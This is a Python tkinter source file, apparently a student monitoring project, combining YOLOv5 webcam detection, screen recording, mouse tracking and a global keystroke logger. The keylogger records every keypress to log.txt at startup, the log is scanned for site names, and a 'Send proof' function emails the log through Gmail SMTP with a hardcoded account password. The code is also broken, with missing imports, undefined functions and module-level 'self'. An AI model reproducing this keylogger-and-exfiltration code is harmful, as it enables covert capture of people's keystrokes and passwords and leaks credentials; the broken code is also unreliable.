import subprocess
import threading
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from tkinter import filedialog
from tkinter import ttk
import cv2
import numpy as np
import pyautogui
import torch
from PIL import Image, ImageTk
from ttkthemes import ThemedStyle

screenshot_dir = '0'


# Function to destroy the application
def quit_app():
    root.destroy()

# ___________________________________________________________________________________
# ________________________ Screenshot Folder Select _________________________________
def screenshot_folder():
    global screenshot_dir
    screenshot_dir = filedialog.askdirectory()
    # print(screenshot_dir)


print(screenshot_dir)
# _________________________ Mouse Event ______________________

tracking = False  # Mouse tracking flag


# Function to handle mouse movement
def on_mouse_move(event):
    x, y = event.x, event.y
    if tracking:
        # text_widget.insert(tk.END, f'Mouse Coordinates: ({x}, {y})\n')
        mouse_label.config(text=f"Mouse coordinates: ({x}, {y})")


# Function to start mouse tracking
def start_mouse_tracking():
    global tracking
    tracking = True
    root.bind('<Motion>', on_mouse_move)


# Function to stop mouse tracking
def stop_mouse_tracking():
    global tracking
    tracking = False


# __________________________Keyboard Press____________________

import tkinter as tk

text_widget = None
capturing = False


from pynput.keyboard import Listener

def remove_last_letter_from_file(file_path):
    # Open the file in read mode to read its content
    with open(file_path, 'r') as f:
        content = f.read()

    # Check if the content is not empty
    if content:
        # Truncate the file to remove the last character
        with open(file_path, 'w') as f:
            f.write(content[:-1])

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"
    if letter == "Key.backspace":
        # Call the function to remove the last letter from the file
        remove_last_letter_from_file("log.txt")
        return  # Skip writing to the file for backspace
    if letter == "Key.cmdw":
        letter == 'Tab closed'

    with open("log.txt", 'a') as f:
        f.write(letter)

# Collecting events until stopped
with Listener(on_press=write_to_file) as l:
    l.join()

def clear_file(file_path):
    # Open the file in write mode to clear its content
    with open(file_path, 'w') as f:
        # Write an empty string to the file
        f.write('')


file_path = 'log.txt'
clear_file(file_path)

def find_social_media_platforms(file_path):
    # List of known social media platforms
    social_media_platforms = ["facebook", "twitter", "instagram", "netlfix", "snapchat", "youtube","amazon"]

    # Open the file in read mode
    with open(file_path, 'r') as file:
        # Read each line in the file
        for line in file:
            # Remove leading and trailing whitespaces
            name = line.strip().lower()

            # Check if the name corresponds to a known social media platform
            if name in social_media_platforms:
                print(f"Found social media platform: {name}")

file_path = 'log.txt'
find_social_media_platforms(file_path)

def check_file_length(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            content = file.read()
            if len(content) > 250:
                print("Too busy on laptop")
            else:
                print("File length is within the acceptable range.")
    except FileNotFoundError:
        print(f"File '{filename}' not found.")
    except Exception as e:
        print(f"An error occurred: {e}")


check_file_length('log.txt')

# ____________________________________________________________
# Initialize the webcam capture as a global variable
cap = None


# Function to start the webcam feed
def start_webcam():
    global cap
    if cap is None:
        # Initialize the webcam capture
        cap = cv2.VideoCapture(0)  # Use the default camera (index 0)

    def update():
        global output_file
        output_file = screenshot_dir + "/screen_record.avi"
        ret, frame = cap.read()
        if ret:
            # Detect objects in the frame
            results = model(frame)
            # Draw bounding boxes around the detected objects
            for i, det in enumerate(results.pred[0]):
                xmin, ymin, xmax, ymax, _, conf = det.tolist()
                if conf > 0.2:  # Adjust the confidence threshold as needed
                    xmin, ymin, xmax, ymax = map(int, [xmin, ymin, xmax, ymax])
                    cv2.rectangle(frame, (xmin, ymin), (xmax, ymax), (0, 255, 0), 2)

                    # Check if the detected label matches the target label
                    if results.names[i] in target_labels and conf > 0.3:
                        global screenshot_counter  # Define a global counter variable
                        screenshot_counter += 1  # Increment the counter
                        # Capture a screenshot of the frame
                        cv2.imwrite(f'{screenshot_dir}/ss_{results.names[i]}{screenshot_counter}.jpg', frame)
                        print("Screenshot Captured")

            # Display the frame
            frame = cv2.resize(frame, (600, 600))
            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            photo = ImageTk.PhotoImage(Image.fromarray(frame_rgb))
            canvas.create_image(0, 0, anchor=tk.NW, image=photo)
            canvas.image = photo
            canvas.after(10, update)

    update()


# Function to stop the webcam and close the tkinter window
def stop_webcam():
    global cap
    if cap is not None:
        cap.release()
        cap = None
        # root.destroy()  # Explicitly destroy the tkinter window


# Set the path to the YOLOv5 model
weights_path = '/Users/manumaddi/yolov5/runs/train/exp2/weights/best.pt'
# Set the path to the YOLOv5 config file
config_path = '/Users/manumaddi/yolov5/eye_tracker-2/data.yaml'

# Load the YOLOv5 model
model = torch.hub.load('/Users/manumaddi/yolov5', 'custom', path=weights_path, source='local')

# Set the label(s) you want to detect
target_labels = ['']  # Adjust this to the labels you are interested in
# ____________________________________________________________________________
# ___________________ Screen Record__________________________________________

# Create a variable to specify the output video file
# Set the screen recording dimensions
screen_width, screen_height = 600, 600
recording = False
paused = False
out = None
recorded_frames = []
global screenshot_dir
output_file = screenshot_dir + "/screen_record.avi"

class LoginScreen(tk.Toplevel):
    def __init__(self, parent, on_login_success):
        super().__init__(parent)
        self.parent = parent
        self.on_login_success = on_login_success
        self.title("Login")
        self.geometry("300x150")
        self.resizable(False, False)

        # Username and Password variables
        self.username_var = tk.StringVar()
        self.password_var = tk.StringVar()

        # Labels, Entry, and Button widgets
        tk.Label(self, text="Username:").pack(pady=5)
        self.username_entry = tk.Entry(self, textvariable=self.username_var)
        self.username_entry.pack(pady=5)

        tk.Label(self, text="Password:").pack(pady=5)
        self.password_entry = tk.Entry(self, textvariable=self.password_var, show="*")
        self.password_entry.pack(pady=5)

        login_button = tk.Button(self, text="Login", command=self.login)
        login_button.pack(pady=10)

    def login(self):
        # Hardcoded username and password for demonstration purposes
        valid_username = "user"
        valid_password = "password"

        entered_username = self.username_var.get()
        entered_password = self.password_var.get()

        if entered_username == valid_username and entered_password == valid_password:
            messagebox.showinfo("Login Successful", "Welcome, {}".format(entered_username))
            self.on_login_success()
            self.destroy()  # Close the login window
        else:
            messagebox.showerror("Login Failed", "Invalid username or password")

# Function to start or pause screen recording
def toggle_screen_record():
    global recording, paused, out
    if recording:
        paused = not paused
        if paused:
            screen_record_button.config(text="Resume Recording")
        else:
            screen_record_button.config(text="Pause Recording")
    else:
        # Start recording
        recording = True
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(output_file, fourcc, 20.0, (screen_width, screen_height))
        screen_record_button.config(text="Pause Recording")
        # Start the screen recording thread
        screen_record_thread = threading.Thread(target=record_screen)
        screen_record_thread.start()


# Function to stop and save the recorded video
def stop_and_save():
    global recording, paused, out
    if recording or paused:
        recording = False
        paused = False
        out.release()
        screen_record_button.config(text="Start Recording")
        recorded_frames.clear()
        combine_and_save_video()


# Function to combine and save the recorded frames as a video
def combine_and_save_video():
    global screenshot_dir
    # global output_file
    output_file = screenshot_dir + "/screen_record.avi"
    print("OUT", output_file)
    if len(recorded_frames) == 0:
        return
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(output_file, fourcc, 20.0, (screen_width, screen_height))
    for frame in recorded_frames:
        out.write(frame)
    out.release()


# Function to continuously capture and record the screen
def record_screen():
    global out
    while recording:
        screenshot = pyautogui.screenshot(region=(0, 0, screen_width, screen_height))
        frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
        recorded_frames.append(frame)
        out.write(frame)


def send_email():
    def send_email(subject, body, to_email, attachment_path=None):
        # Create an MIMEMultipart object
        msg = MIMEMultipart()

        # Set the email subject
        msg['Subject'] = subject

        # Attach the email body as text
        msg.attach(MIMEText(body, 'plain'))

        # If an attachment path is provided, attach the file
        if attachment_path:
            with open("log.txt", "rb") as attachment:
                # Create an MIMEApplication object for the attachment
                part = MIMEApplication(attachment.read(), Name="log.txt")
                # Set the Content-Disposition header to specify the file name
                part['log.txt'] = f'attachment; filename="{"log.txt"}"'
                # Attach the file to the email
                msg.attach(part)

        # Create an SMTP object and connect to the Gmail server
        s = smtplib.SMTP('smtp.gmail.com', 587)

        # Start TLS (Transport Layer Security) encryption for a secure connection
        s.starttls()

        try:
            # Log in to the Gmail account with the provided credentials
            s.login("instantjob0@gmail.com", "cwmtrjmmnlhmfnez")

            # Send the email using the sendmail method, providing sender, recipient, and the email message
            s.sendmail("instantjob0@gmail.com", to_email, msg.as_string())

            print("Email sent successfully.")

            return True
        except Exception as e:
            print(f"Error: {e}")
            return False
        finally:
            # Close the connection to the SMTP server
            s.quit()

    # Example usage with an attachment
    email_subject = "Test Email with Attachment"
    email_body = "Hello, this is a test email with an attachment."
    recipient_email = "t00120@reading-school.co.uk"
    attachment_file_path = "/Users/manumaddi/log.txt"

    send_email(email_subject, email_body, recipient_email, attachment_file_path)


# Create the tkinter window
root = tk.Tk()
root.title("Webcam Viewer")
root.geometry("600x600")

# Apply a modern theme
style = ThemedStyle(root)
style.set_theme("plastik")  # You can choose other themes like "arc", "radiance", "scidblue", etc.

# Set the screen recording dimensions
screen_width, screen_height = 600, 600

# Create a canvas to display the webcam feed
canvas = tk.Canvas(root, width=600, height=600)
canvas.grid(row=1, column=0)

quit_button = tk.Button(root, text="Quit", command=root.destroy)
quit_button.grid(row=2, column=2)
mouse_label = ttk.Label(root, text="Mouse coordinates: (0, 0")
screenshot_button = ttk.Button(root, text="Screenshot", command=screenshot_folder)
screen_record_button = ttk.Button(root, text="Start Recording", command=toggle_screen_record)
stop_button = ttk.Button(root, text="Stop and Save", command=stop_and_save)
start_button = ttk.Button(root, text="Start Webcam", command=start_webcam)
stop_button = ttk.Button(root, text="Stop Webcam", command=stop_webcam)
quit_button = ttk.Button(root, text="Quit", command=quit_app)
start_keyboard = ttk.Button(root, text="Start Keyboard Capture", command=start_key_capture)
save_keyboard = ttk.Button(root, text="Save captured text", command=save_captured_text)
stop_keyboard = ttk.Button(root, text="stop key capture", command=stop_key_capture)
start_mouse = ttk.Button(root, text="Start Tracking", command=start_mouse_tracking)
stop_mouse = ttk.Button(root, text="Stop Tracking", command=stop_mouse_tracking)
send_email = ttk.Button(root, text="Send proof", command=send_email)
self.login_button = ttk.Button(self, text="Login", command=self.show_login_screen)


# Set up widget layout
mouse_label.grid(row=1, column=1, padx=10, pady=10)
screenshot_button.grid(row=1, column=2, padx=10, pady=10)
screen_record_button.grid(row=1, column=3)
stop_button.grid(row=1, column=4)
start_button.grid(row=2, column=0)
stop_button.grid(row=2, column=1)
quit_button.grid(row=2, column=2)
start_keyboard.grid(row=2, column=3)
save_keyboard.grid(row=2, column=4)
stop_keyboard.grid(row=1, column=5)
start_mouse.grid(row=2, column=5)
stop_mouse.grid(row=2, column=6)
send_email.grid(row=1, column=6)
self.login_button.grid(row=2, column=7)

screenshot_counter = 0
screenshot_dir = '0'

# Start the tkinter main event loop
root.mainloop()



